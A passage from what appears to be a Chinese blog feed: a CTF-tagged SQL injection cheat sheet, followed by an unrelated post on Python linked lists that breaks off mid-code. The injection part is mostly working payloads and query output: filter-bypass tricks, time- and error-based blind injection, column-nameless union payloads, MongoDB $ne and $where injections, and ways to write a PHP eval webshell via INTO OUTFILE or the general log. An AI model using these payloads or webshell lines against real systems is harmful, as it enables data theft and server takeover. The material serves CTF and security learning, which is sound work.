        <content type="html"><![CDATA[<h2 id="常用的绕过手段"><a href="#常用的绕过手段" class="headerlink" title="常用的绕过手段"></a>常用的绕过手段</h2><h3 id="字符型过滤单引号"><a href="#字符型过滤单引号" class="headerlink" title="字符型过滤单引号"></a>字符型过滤单引号</h3><ul><li>字符串转换函数绕过</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char()</span><br></pre></td></tr></table></figure><ul><li>十六进制数绕过</li></ul><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><p>between, like, &lt;, &gt;，regexp 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1, table_name from information_schema.tables where table_name &#x3D; &#39;users&#39;</span><br><span class="line"></span><br><span class="line">select 1, table_name from information_schema.tables where table_name between &#39;u&#39; and &#39;v&#39;;</span><br><span class="line"></span><br><span class="line">select 1, table_name from information_schema.tables where table_name like &#39;u%&#39;;</span><br></pre></td></tr></table></figure><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># %23</span><br><span class="line">-- 后面要加空格</span><br><span class="line">&#x2F;**&#x2F; 只加前半个也行</span><br><span class="line">;%00 Nullbyte</span><br><span class="line">&#96; Backtick</span><br></pre></td></tr></table></figure><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure><p>使用join(连接表的查询结果)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>     <span class="comment">#等价于</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> ((<span class="keyword">SELECT</span> <span class="number">1</span>)a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>)b <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">3</span>)c <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">4</span>)d <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">5</span>)e);</span><br><span class="line">+<span class="comment">---+---+---+---+---+</span></span><br><span class="line">| 1 | 2 | 3 | 4 | 5 |</span><br><span class="line">+<span class="comment">---+---+---+---+---+</span></span><br><span class="line">| 1 | 2 | 3 | 4 | 5 |</span><br><span class="line">+<span class="comment">---+---+---+---+---+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>使用like</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">80</span>   <span class="comment">#等价于</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'r%'</span></span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'r%'</span>;</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| user() like 'r%' |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">|                1 |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>对于 <code>limit</code> 可以使用 offset绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment"># 等价于下面这条SQL语句</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="lt-，-gt-被过滤"><a href="#lt-，-gt-被过滤" class="headerlink" title="&lt;，&gt;被过滤"></a>&lt;，&gt;被过滤</h3><ul><li>greatest函数绕过</li></ul><blockquote><p>greatest(a,b)，返回a和b中较大的那个数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 猜解user()第一个字符的ascii码是否小于等于150时</span><br><span class="line">ascii(mid(user(),1,1)) &lt;&#x3D; 150</span><br><span class="line">&#x3D;greatest(ascii(mid(user(),1,1)), 150)&#x3D;150;</span><br></pre></td></tr></table></figure><h3 id="过滤and，or可以使用-amp-amp-和"><a href="#过滤and，or可以使用-amp-amp-和" class="headerlink" title="过滤and，or可以使用&amp;&amp;和||"></a>过滤and，or可以使用&amp;&amp;和||</h3><h3 id="单引号逃逸"><a href="#单引号逃逸" class="headerlink" title="单引号逃逸"></a>单引号逃逸</h3><ul><li>\</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 用户名为username</span><br><span class="line">SQL&gt; select * from db where name&#x3D;&#39;username\&#39; and passwd&#x3D;&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure><h3 id="注释符-1"><a href="#注释符-1" class="headerlink" title="注释符"></a>注释符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># %23</span><br><span class="line">-- 后面要加空格</span><br><span class="line">&#x2F;**&#x2F; 只加前半个也行</span><br><span class="line">;%00 Nullbyte</span><br><span class="line">&#96; Backtick</span><br></pre></td></tr></table></figure><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>利用数值计算盲注或时间盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|| ascii(mid(user(),1,1) ) &#x3D; 97 %23</span><br></pre></td></tr></table></figure><h3 id="绕过-information-被过滤"><a href="#绕过-information-被过滤" class="headerlink" title="绕过 information 被过滤"></a>绕过 information 被过滤</h3><ol><li>MySQL 5.7之后的版本，在其自带的 mysql 库中，新增了<code>innodb_table_stats</code> 和<code>innodb_index_stats</code>这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息 。<br>如果waf掉了<code>information</code>我们可以利用这两个表注入数据库名和表名。</li><li>参考 <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a></li></ol><p>MySQl5.7的新特性</p><ul><li>sys.schema_auto_increment_columns  该视图的作用简单来说就是用来对表自增ID的监控。</li><li>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer</li></ul><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>数据库如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | zz       | 25ed1bcb423b0b7200f485fc5ff71c8e |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select password from user where id&#x3D;1 and  (select hex(substr(database(), 1,1)) &gt; 20) and sleep(2);</span><br><span class="line">Empty set (2.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select password from user where id&#x3D;1 and  (select hex(substr(database(), 1,1)) &gt; 89) and sleep(2);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p>我们这么来理解多语句的and</p><p>数据库会每次取出一行数据，然后做判断，首先 <code>id=1</code> 成立，然后 判断<code>(select hex(substr(database(), 1,1)) &gt; 20)</code> </p><p>如果这个成立，就会执行接下来的 <code>sleep(2)</code> 如果不成立，那么直接over了。不会有延时</p><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p>order by 后的数字可以作为一个注入点</p><p>报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag order by 1 and (updatexml(1,concat(0x7e,(select user())),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39;</span><br></pre></td></tr></table></figure><p>时间盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from flag order by 1 and if(1&#x3D;1,sleep(3), NULL);</span><br></pre></td></tr></table></figure><h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。</p><p>报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id&gt;1 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.53&#39;</span><br></pre></td></tr></table></figure><p>时间注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&gt;1 order by id limit 1,1 procedure analyse((select extractvalue (rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);</span><br></pre></td></tr></table></figure><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p><a href="https://buuoj.cn/challenges#[SWPU2019]Web1" target="_blank" rel="noopener">例题链接</a></p><blockquote><p>过滤了空格和or，并且没办法绕过过滤or</p><p>同时不知道列名</p><p>payload: <code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></p></blockquote><p>这样在不知道列名的情况下，就可以给每一列取一个别名了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from user;</span><br><span class="line">+---+-------+--------+</span><br><span class="line">| 1 | 2     | 3      |</span><br><span class="line">+---+-------+--------+</span><br><span class="line">| 1 | 2     | 3      |</span><br><span class="line">| 1 | admin | mysql  |</span><br><span class="line">| 2 | hhh   | 123    |</span><br><span class="line">| 3 | aaaaa | cccccc |</span><br><span class="line">+---+-------+--------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select group_concat(b) from (select 1,2,3 as b union select * from user)a;</span><br><span class="line">+--------------------+</span><br><span class="line">| group_concat(b)    |</span><br><span class="line">+--------------------+</span><br><span class="line">| 3,mysql,123,cccccc |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>查询两列数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(&#96;2&#96;,0x3a,&#96;3&#96;) from (select 1,2,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p>查询一行数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;2&#96; from (select 1,2,3 union select * from users)a limit 1,1;</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">无列名注入参考</a></p><p><strong>使用join进行无列名注入</strong></p><p>这样就能依次把列名都爆出来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user;</span><br><span class="line">+---------+-----------+-----------+</span><br><span class="line">| user_id | user_name | user_pass |</span><br><span class="line">+---------+-----------+-----------+</span><br><span class="line">|       1 | admin     | mysql     |</span><br><span class="line">|       2 | hhh       | 123       |</span><br><span class="line">|       3 | aaaaa     | cccccc    |</span><br><span class="line">+---------+-----------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select*from (select * from user as a join user b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;user_id&#39;</span><br><span class="line">mysql&gt; select*from (select * from user as a join user b using(user_id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;user_name&#39;</span><br></pre></td></tr></table></figure><h2 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h2><p>以mongodb为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">db.collection.find(query, projection)</span><br><span class="line">&#x2F;&#x2F;query 可选，使用查询操作符指定查询条件</span><br><span class="line">&#x2F;&#x2F;可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）</span><br><span class="line">举例：</span><br><span class="line">&#x2F;&#x2F;查找username为JrXnm的信息</span><br><span class="line">db.user.find(&#123;&#39;username&#39;:&#39;JrXnm&#39;&#125;)</span><br></pre></td></tr></table></figure><p>第一种是按照语言的分类：php数组注入、js注入、mongo shell拼接注入。</p><p>第二种是按照攻击机制分类：永真式、联合查询、Js注入、盲注等。</p><p>PHP永真式注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; array(</span><br><span class="line">    &#39;username&#39; &#x3D;&gt;  $_REQUEST[&#39;username&#39;],</span><br><span class="line">    &#39;password&#39; &#x3D;&gt;  $_REQUEST[&#39;password&#39;]</span><br><span class="line">); </span><br><span class="line">$cursor &#x3D; $collection-&gt;find($data);</span><br></pre></td></tr></table></figure><p>但是由于php松散结构的特性，如果我们_GET传入的是数组那么，会自动被解析成字典。比如我们输入<code>?username[$ne]=1&amp;password[$ne]=1</code>， 就会被解析成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;username&#39;: &#123;</span><br><span class="line">        &#39;$ne&#39;: &#39;1&#39;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;password&#39;: &#123;</span><br><span class="line">        &#39;$ne&#39;: &#39;1&#39;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就能查询到所有用户信息</p><p>Js注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$collection &#x3D; $db-&gt;users;</span><br><span class="line">$query_body &#x3D;&quot;</span><br><span class="line">        function q() &#123;</span><br><span class="line">            var username &#x3D; &#39;&quot;.$_REQUEST[&quot;username&quot;].&quot;&#39;;</span><br><span class="line">            var password &#x3D; &#39;&quot;.$_REQUEST[&quot;password&quot;].&quot;&#39;;if(username &#x3D;&#x3D; &#39;secret_user&#39;&amp;&amp;password &#x3D;&#x3D; &#39;secret_password&#39;) return true; else&#123; return false;&#125;&#125;</span><br><span class="line">&quot;; </span><br><span class="line">$result &#x3D; $collection-&gt;find(array(&#39;$where&#39;&#x3D;&gt;$query_body));</span><br><span class="line">$count &#x3D; $result-&gt;count();</span><br><span class="line">if($count&gt;0)&#123;</span><br><span class="line">    echo $doc_succeed-&gt;saveHTML();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$where</code>操作符表示执行其中的Js内容，返回True的话返回所有内容。</p><p>我们可以看到我们可以注入使得Js代码提前返回True</p><p>payload：<code>?username=qwer&amp;password= 1&#39;;return true;var qwer=&#39;1</code></p><h2 id="MySQL利用方式"><a href="#MySQL利用方式" class="headerlink" title="MySQL利用方式"></a>MySQL利用方式</h2><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><h4 id="联合查询写shell"><a href="#联合查询写shell" class="headerlink" title="联合查询写shell"></a>联合查询写shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION+ALL+SELECT+1,2,’&lt;? phpinfo(); ?&gt;’ into outfile ‘G:&#x2F;2.txt’ %23</span><br></pre></td></tr></table></figure><h4 id="非联合查询写shell"><a href="#非联合查询写shell" class="headerlink" title="非联合查询写shell"></a>非联合查询写shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1 into outfile ‘G:&#x2F;2.txt’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23</span><br></pre></td></tr></table></figure><h4 id="使用日志写shell"><a href="#使用日志写shell" class="headerlink" title="使用日志写shell"></a>使用日志写shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; on;</span><br><span class="line">开启日志监测，一般是关闭的，如果一直开，文件会很大的。</span><br><span class="line"></span><br><span class="line">set global general_log_file &#x3D; ‘G:&#x2F;2.txt’;</span><br><span class="line">这里设置我们需要写入的路径就可以了。</span><br><span class="line"></span><br><span class="line">select ‘&lt;?php eval($_POST[‘shiyan’]);?&gt;’;</span><br><span class="line">查询一个一句话，这个时候log日志里就会记录这个。</span><br><span class="line"></span><br><span class="line">set global general_log_file &#x3D; ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;</span><br><span class="line">结束后，再修改为原来的路径。</span><br><span class="line"></span><br><span class="line">set global general_log &#x3D; off;</span><br><span class="line">关闭下日志记录。</span><br></pre></td></tr></table></figure><h4 id="延时注入写shell"><a href="#延时注入写shell" class="headerlink" title="延时注入写shell"></a>延时注入写shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sleep(2),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;d:\\success.txt&#39;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python数据结构</title>
      <link href="/posts/7f8e2ad4/"/>
      <url>/posts/7f8e2ad4/</url>
      
        <content type="html"><![CDATA[<p>补充一个小知识</p><p>python 输入重定向为文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">sys.stdin &#x3D; open(&quot;test.txt&quot;)</span><br></pre></td></tr></table></figure><p>之后就可以直接从文件读入，不需要手动输入了</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">实现链表</span><br><span class="line">输入</span><br><span class="line">1 3 5 4 1 9 4 </span><br><span class="line">将其存储为链表格式</span><br></pre></td></tr></table></figure><p>链表数据结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x=<span class="number">-1</span>)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="创建链表，返回头节点-尾插法"><a href="#创建链表，返回头节点-尾插法" class="headerlink" title="创建链表，返回头节点 (尾插法)"></a>创建链表，返回头节点 (尾插法)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat_list</span><span class="params">(line:list)</span> -&gt; ListNode:</span></span><br><span class="line">    root = ListNode()</span><br><span class="line">    tail = root</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> line:</span><br><span class="line">        temp = ListNode(i)</span><br><span class="line">        tail.next = temp</span><br><span class="line">        tail = tail.next  </span><br><span class="line">    <span class="keyword">return</span> root.next</span><br></pre></td></tr></table></figure><h3 id="遍历链表"><a href="#遍历链表" class="headerlink" title="遍历链表"></a>遍历链表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">traverse_list</span><span class="params">(root:ListNode)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    遍历链表，没有头节点</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    temp = root</span><br><span class="line">    <span class="keyword">while</span> temp:</span><br><span class="line">        print(temp.val+<span class="string">" "</span>,end=<span class="string">""</span>)</span><br><span class="line">        temp = temp.next</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><h3 id="删除倒数第n个节点，一次遍历"><a href="#删除倒数第n个节点，一次遍历" class="headerlink" title="删除倒数第n个节点，一次遍历"></a>删除倒数第n个节点，一次遍历</h3><p>用两个指针指向，第一个指针先走 <code>n+1</code> 步，中间空出n个节点，然后删除即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">removeNthFromEnd</span><span class="params">(head:ListNode, n:int)</span>-&gt;ListNode:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    一次遍历算法</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    new_head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    new_head.next = head</span><br><span class="line">    first = new_head</span><br><span class="line">    second = new_head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n+<span class="number">1</span>):</span><br><span class="line">        first = first.next    </span><br><span class="line">    <span class="keyword">while</span> first != <span class="literal">None</span>:</span><br><span class="line">        first = first.next</span><br><span class="line">        second = second.next</span><br><span class="line">    second.next = second.next.next</span><br><span class="line">    <span class="keyword">return</span> new_head.next</span><br></pre></td></tr></table></figure><h3 id="向右旋转链表"><a href="#向右旋转链表" class="headerlink" title="向右旋转链表"></a>向右旋转链表</h3><p>就是把单链表组成一个循环链表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotateRight</span><span class="params">(head:ListNode, k:int)</span>-&gt;ListNode:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    针对链表进行旋转</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> head</span><br><span class="line">    <span class="keyword">if</span> head == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> head</span><br><span class="line">    temp = head</span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> temp.next != <span class="literal">None</span>:</span><br><span class="line">        length += <span class="number">1</span></span><br><span class="line">        temp = temp.next</span><br><span class="line">    length += <span class="number">1</span></span><br><span class="line">    temp.next = head</span><br><span class="line">    temp = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range((length - k%length <span class="number">-1</span>)):</span><br><span class="line">        temp = temp.next</span><br><span class="line">    new_head = temp.next</span><br><span class="line">    temp.next = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> new_head</span><br></pre></td></tr></table></figure><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="创建图"><a href="#创建图" class="headerlink" title="创建图"></a>创建图</h3><p>采用邻接表进行存储， <code>ArcNode</code> 代表邻接点， <code>VNode</code> 代表边节点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArcNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,adjvex, weight)</span>:</span></span><br><span class="line">        self.adjvex = adjvex</span><br><span class="line">        self.weight = weight</span><br><span class="line">        self.next = <span 